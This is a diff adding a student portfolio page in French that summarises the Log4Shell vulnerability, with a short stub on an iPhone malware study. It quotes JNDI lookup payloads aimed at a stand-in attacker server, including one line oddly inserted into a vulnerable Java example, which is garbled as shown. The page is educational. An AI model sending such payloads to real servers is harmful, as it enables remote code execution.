@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="en">
+<! --- Utiliser fontawesome --- >
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Veille Technologique</title>
+
+<! ----- CSS ------>
+    <link href="css/bootstrap.min.css" rel="stylesheet">
+    <link href="css/bootstrap.css" rel="stylesheet">
+    <link href="css/bootstrap-reboot.css" rel="stylesheet">
+    <link href="css/bootstrap-reboot.min.css" rel="stylesheet">
+    <link href="css/bootstrap-grid.css" rel="stylesheet">
+    <link href="css/bootstrap-grid.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
+
+<! ----- JS ------>    
+  <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.2/dist/umd/popper.min.js" integrity="sha384-IQsoLXl5PILFhosVNubq5LC7Qb9DXgDA9i+tQ8Zj3iwWAwPtgFTxbJ8NT4GN1R8p" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.1/dist/js/bootstrap.min.js" integrity="sha384-Atwg2Pkwv9vp0ygtn1JAojH0nYbwNJLPhwyoVbhoPwBhjQPR5VtM2+xf0Uwh9KtT" crossorigin="anonymous"></script>
+</head>
+
+<body>
+
+<! ----- Barre de Navigation ------ >
+
+
+  <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
+    <div class="container-fluid">
+      <a class="navbar-brand" href="Accueil.html">Portefolio SIO - ESICAD </a>
+      <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarSupportedContent" >
+        <span class="navbar-toggler-icon"></span>
+      </button>
+      <div class="collapse navbar-collapse" id="navbarSupportedContent">
+        <ul class="navbar-nav ">
+          <li class="nav-item active">
+            <a class="nav-link" href="Parcours.html">Mon Parcours</a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link" href="Alternance.html">Mon Alternance</a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link" href="Projets.html">Mes Projets</a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link" href="Veille.html">Veille Technologique</a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link" href="Contact.html">Contact</a>
+          </li>
+        </ul>
+      </div>
+    </div>
+  </nav>
+<! ----- Bannière ----- >
+
+  <div style="background-image: url('Images/banniereaccueil.jpg'); height: 175px;">
+  </div>
+  <br>
+  <div class="ms-3">
+    <h1>Veille Technologique</h1>
+    <p>J'ai choisi le thème de cybersécurité pour ma veille technologique.</p>
+    <h3>La vulnérabilité de la bibliothèque Log4j et son exploit Log4Shell</h3>
+    <p>Sources:
+      <div class="ms-4"> 
+        <li><a href="https://www.futura-sciences.com/tech/actualites/cybersecurite-log4shell-faille-fait-trembler-tous-serveurs-95521/">Futura-sciences/Log4Shell</a> - 05/01/2022</li>
+        <li><a href="https://www.lunasec.io/docs/blog/log4j-zero-day/">LunaSec/log4j-zero-day</a> - 19/12/2021</li>
+      </div>
+    </p>
+    <p>La faille log4Shell est une vulnérabilité présente dans la bibliothèque Apache Log4j Java. Il s'agit à ce jour d'une des pires failles de sécurité découverte. Notée 10/10 par Cert France, elle a été qualifiée de faille "critique" d'une part pour sa facilité de mise en oeuvre mais aussi car la bibliothèque concernée est utilisée par la majorité des serveurs utilisant Java.</p>
+    <div class="row align-items-md-stretch">
+      <div class="col-md-5">
+            <div class="h-100 p-5 text-white bg-dark rounded-3">
+              <p>La faille Log4Shell (CVE-2021-44228) permet l'execution de code arbitraire à partir d'une boite de dialogue dédiée aux logins.</p>
+            </div>
+          </div>
+      <div class="col-md-5">
+        <div class="h-100 p-5 bg-light border rounded-3">
+          <p>Elle peut être utilisée avec des payloads de la forme: "${jndi:ldap://serveur_pirate/message_malveillant}"</p>
+        </div>
+      </div>     
+    </div>
+    <br>
+    <div class="container">
+        <div class="ms-3">
+          <h5>Exemple de code vulnérable à la faille Log4Shell</h5>
+          import org.apache.logging.log4j.LogManager;<br>
+          import org.apache.logging.log4j.Logger;<br>
+          <br>
+          import java.io.*;<br>
+          import java.sql.SQLException;<br>
+          import java.util.*;<br>
+          <br>
+          public class VulnerableLog4jExampleHandler implements HttpHandler {<br>
+          <br>
+            static Logger log = LogManager.getLogger(<br>VulnerableLog4jExampleHandler.class.getName());<br>
+          <br>
+            public void handle(HttpExchange he) throws IOException {<br>
+              String apiVersion = he.getRequestHeader("X-Api-Version");<br>
+          <br>
+          ${jndi:ldap://some-attacker.com/a}<br>
+              log.info("Requested Api Version:{}", apiVersion);<br>
+          <br>
+              String response = "Hello from: " + apiVersion + "!";<br>
+              he.sendResponseHeaders(200, response.length());<br>
+              OutputStream os = he.getResponseBody();<br>
+              os.write(response.getBytes());<br>
+              os.close();<br>
+            }<br>
+          }<br>
+        </div>
+        <br>
+      </div>
+      <h5>La postérité de la découverte de la faille</h5>
+      <div>Immédiatement après la parution de la faille, les entreprises ont imposé des mises à jour sur leurs produits afin de limiter le dégats. 10 Jours après le 0-Day, près de 45 pourcents des systèmes vulnérable étaient patchés.</div>
+      <div>Néanmoins, plusieurs entreprises (telles que Microsoft ou Check Point) admettent que la vulnérabilité causera encore des dommages à l'avenir. En effet, de nombreuses infrastructures (notamment les smart TV) ne subissent plus de patchs réguliers de sécurité, ainsi, un nombre important d'appareils resteront exploitables.</div>
+    </div>
+    <br>
+    <br>
+    <div class="ms-4">
+      <h3>Le malware Evil Never Sleep</h3>
+      <p>Sources:
+        <div class="ms-4"> 
+          <li><a href="https://www.01net.com/actualites/des-chercheurs-ont-developpe-un-malware-pour-attaquer-votre-iphone-meme-quand-il-est-eteint-2056273.html">01.Net/Malware_Iphone</a> - 17/05/2022</li>
+        </div>
+      </p>
+      <p>Le mode veille des téléphones Apple.</p>
+    </div>
+  </div>
+
+</body>
+
+
+<footer class="bg-dark">
+  <hr class="my-2">
+  <p class="ms-3" style="color: white; margin-bottom: 0px;padding-bottom: 24px;">Maxime ALBERTUS - ESICAD MONTPELLIER SIO1 - All Rights Reserved</p>
+</footer>
+</html>
